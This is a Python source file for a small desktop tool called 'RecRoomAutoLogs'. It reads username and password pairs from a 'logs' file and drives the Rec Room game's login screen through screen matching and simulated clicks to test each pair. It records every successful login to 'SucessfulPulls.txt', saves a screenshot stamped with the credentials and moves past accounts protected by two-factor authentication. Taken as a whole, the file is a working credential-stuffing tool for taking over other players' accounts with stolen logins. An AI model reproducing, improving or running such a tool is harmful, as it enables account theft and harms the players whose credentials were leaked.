import tkinter as tk
from PIL import Image, ImageTk, ImageDraw, ImageFont
import pyperclip
import keyboard
import time
import pyautogui
import cv2
import numpy as np
import os
import random
import mss

def auto():
   while True:
    with open('logs.txt', 'r') as f:
      lines = f.readlines()
      num_lines = len(lines)
    
    global line_bool
    global line_index

    if line_bool == True:
       line_index = line_index
    else:
      time.sleep(3)

      line_bool = True

      global line_number_entry

      line_start = int(line_number_entry.get())
      line_index = line_start

    monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}

    threshold = 0.8

    window_title = "Rec Room"

    font = ImageFont.truetype("arial.ttf", 48)

    text_position = (400, 344)
    text_color = (255, 0, 0)

    color = (248,106,22)

    color2 = (186,43,38)

    color3 = (214,64,1)

    sscc = 0

    delay = 0.4
    
    pyperclip.copy(lines[line_index].strip())
    print(f"Copied line {line_index+1}: {lines[line_index].strip()}")

    reference_image1 = cv2.imread('template/USERNAME.png', cv2.IMREAD_COLOR)

    screenshot1 = pyautogui.screenshot()
    screenshot1 = cv2.cvtColor(np.array(screenshot1), cv2.COLOR_RGB2BGR)

    result1 = cv2.matchTemplate(screenshot1, reference_image1, cv2.TM_CCOEFF_NORMED)

    min_val1, max_val1, min_loc1, max_loc1 = cv2.minMaxLoc(result1)

    if max_val1 > threshold:
        pyautogui.moveTo(max_loc1[0] + reference_image1.shape[1] / 2, max_loc1[1] + reference_image1.shape[0] / 2)

    pyautogui.moveTo()

    time.sleep(delay)

    USER = (lines[line_index].strip())

    pyautogui.click()

    time.sleep(delay)
        
    pyautogui.hotkey('ctrl', 'a')

    time.sleep(delay)

    pyautogui.hotkey('ctrl', 'v')

    time.sleep(delay)
 
    line_index = (line_index + 1) % len(lines)
    pyperclip.copy(lines[line_index].strip())
    print(f"Copied line {line_index+1}: {lines[line_index].strip()}")

    reference_image2 = cv2.imread('template/PASSWORD.png', cv2.IMREAD_COLOR)

    screenshot2 = pyautogui.screenshot()
    screenshot2 = cv2.cvtColor(np.array(screenshot2), cv2.COLOR_RGB2BGR)

    result2 = cv2.matchTemplate(screenshot2, reference_image2, cv2.TM_CCOEFF_NORMED)

    min_val2, max_val2, min_loc2, max_loc2 = cv2.minMaxLoc(result2)

    if max_val2 > threshold:
        pyautogui.moveTo(max_loc2[0] + reference_image2.shape[1] / 2, max_loc2[1] + reference_image2.shape[0] / 2)

    time.sleep(delay)

    pyautogui.click()

    PASS = (lines[line_index].strip())

    time.sleep(delay)
        
    pyautogui.hotkey('ctrl', 'v')

    line_index = (line_index + 1) % len(lines)

    time.sleep(delay)

    global remember_account_var
    if not remember_account_var.get():
       reference_image3 = cv2.imread('template/REMEMBER.png', cv2.IMREAD_COLOR)

       screenshot3 = pyautogui.screenshot()
       screenshot3 = cv2.cvtColor(np.array(screenshot3), cv2.COLOR_RGB2BGR)

       result3 = cv2.matchTemplate(screenshot3, reference_image3, cv2.TM_CCOEFF_NORMED)

       min_val3, max_val3, min_loc3, max_loc3 = cv2.minMaxLoc(result3)

       if max_val3 > threshold:
           pyautogui.moveTo(max_loc3[0] + reference_image3.shape[1] / 2, max_loc3[1] + reference_image3.shape[0] / 2)

       time.sleep(0.3)

       pyautogui.click()

    reference_image3 = cv2.imread('template/PLAY.png', cv2.IMREAD_COLOR)

    screenshot3 = pyautogui.screenshot()
    screenshot3 = cv2.cvtColor(np.array(screenshot3), cv2.COLOR_RGB2BGR)

    result3 = cv2.matchTemplate(screenshot3, reference_image3, cv2.TM_CCOEFF_NORMED)

    min_val3, max_val3, min_loc3, max_loc3 = cv2.minMaxLoc(result3)

    if max_val3 > threshold:
        pyautogui.moveTo(max_loc3[0] + reference_image3.shape[1] / 2, max_loc3[1] + reference_image3.shape[0] / 2)

    time.sleep(delay)

    pyautogui.click()

    time.sleep(4)

    if(pyautogui.pixelMatchesColor(1677, 500, color3)):
        eye = True
    else:
        eye = False
 
    if eye == False:
        time.sleep(2)

    ref_image4 = cv2.imread('template/ROOM.png')

    screenshot4 = pyautogui.screenshot()

    img_cv4 = cv2.cvtColor(np.array(screenshot4), cv2.COLOR_RGB2BGR)

    result4 = cv2.matchTemplate(img_cv4, ref_image4, cv2.TM_CCOEFF_NORMED)
    min_val4, max_val4, min_loc4, max_loc4 = cv2.minMaxLoc(result4)

    if max_val4 > 0.8:
     
         string = (USER) + ":" + (PASS) + "\n"

         string2 = (USER) + "`" + (PASS)

         rnd = chr(random.randint(65, 90))

         rnd2 = chr(random.randint(65, 90))

         rnd3 = chr(random.randint(65, 90))

         if '/' in string2 or ':' in string2 or '*' in string2 or '?' in string2 or '"' in string2 or '<' in string2 or '>' in string2 or '|' in string2:
            string2 = "ERROR`ERROR" + rnd + rnd2 + rnd3

         location = string2 + '.png'

         sscc = sscc+1

         with mss.mss() as sct:
          screenshot = sct.grab(monitor)
     
         img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

         text = string

         draw = ImageDraw.Draw(img)
         draw.text(text_position, text, font=font, fill=text_color)

         img.save("accounts/" + location)

         with open("SucessfulPulls.txt", "a") as f:
          f.write(string)

         reference_image = cv2.imread('template/SWITCH.png', cv2.IMREAD_COLOR)

         screenshot = pyautogui.screenshot()
         screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)

         result = cv2.matchTemplate(screenshot, reference_image, cv2.TM_CCOEFF_NORMED)

         min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)

         if max_val > threshold:
           pyautogui.moveTo(max_loc[0] + reference_image.shape[1] / 2, max_loc[1] + reference_image.shape[0] / 2)

         time.sleep(delay)

         pyautogui.click()

         time.sleep(1)

         pyautogui.moveTo(1619, 284)

         time.sleep(delay)

         pyautogui.click()

         time.sleep(1)
    else:
      ref_image = cv2.imread('template/2FA.png')

      screenshot = pyautogui.screenshot()

      img_cv = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)

      result = cv2.matchTemplate(img_cv, ref_image, cv2.TM_CCOEFF_NORMED)
      min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)

      if max_val > 0.8:
      
          pyautogui.moveTo(69, 83)

          time.sleep(delay)

          pyautogui.click()

          time.sleep(2)

line_bool = False
line_index = 0

root = tk.Tk()
root.title("RecRoomAutoLogs")
root.configure(background="black")
root.geometry("474x355")
root.resizable(False, False)

background_image = Image.open("template/bg.jpg") 
background_image = ImageTk.PhotoImage(background_image)

background_label = tk.Label(root, image=background_image)
background_label.image = background_image  
background_label.place(x=0, y=0, relwidth=1, relheight=1)

line_number_label = tk.Label(root, text="Line Number:", fg="black", bg="white")
line_number_label.pack()
line_number_label.place(relx=0.5, rely=0.45, anchor="center")

line_number_entry = tk.Entry(root, width=60, fg="black", bg="white")
line_number_entry.pack()
line_number_entry.place(relx=0.5, rely=0.5, anchor="center")

remember_account_var = tk.BooleanVar()
remember_account_checkbox = tk.Checkbutton(root, text="Remember Account", variable=remember_account_var, fg="black", bg="white")
remember_account_checkbox.pack()
remember_account_checkbox.place(relx=0.5, rely=0.6, anchor="center")

button = tk.Button(root, text="Start", fg="black", bg="white", command=auto)
button.pack()
button.place(relx=0.5, rely=0.7, anchor="center") 

root.mainloop()
